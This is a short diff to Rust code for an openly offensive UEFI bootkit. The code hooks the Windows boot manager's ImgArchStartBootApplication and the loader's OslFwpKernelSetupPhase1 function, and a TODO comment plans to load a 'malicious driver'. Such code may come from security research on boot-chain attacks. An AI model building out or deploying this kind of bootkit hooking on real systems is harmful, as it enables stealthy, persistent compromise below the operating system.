@@ -73,8 +73,8 @@ fn efi_main(image_handle: Handle, system_table: SystemTable<Boot>) -> Status {
     Status::SUCCESS
 }
 
+/// Find and hook ImgArchStartBootApplication to recover control when winload.efi is ready to be executed.
 fn setup_hooks(bootmgr_handle: &Handle, boot_services: &BootServices) {
-    // Find and hook ImgArchStartBootApplication to recover control when winload.efi is ready to be executed
     log::info!("[*] Setting up ImgArchStartBootApplication hook");
     let bootmgr_image = boot_services
         .open_protocol_exclusive::<LoadedImage>(*bootmgr_handle)
@@ -237,6 +237,8 @@ fn osl_fwp_kernel_setup_phase1_hook(loader_block: *mut LOADER_PARAMETER_BLOCK) -
         driver.DllBase,
         driver.SizeOfImage,
     );
+    // TODO: setup target driver hook, load our malicious driver
+    log::info!("[+] WE ARE DONE! See you on the driver's log ;)");
     log::info!("[*] Resuming OslFwpKernelSetupPhase1 execution");
     osl_fwp_kernel_setup_phase1(loader_block)
 }
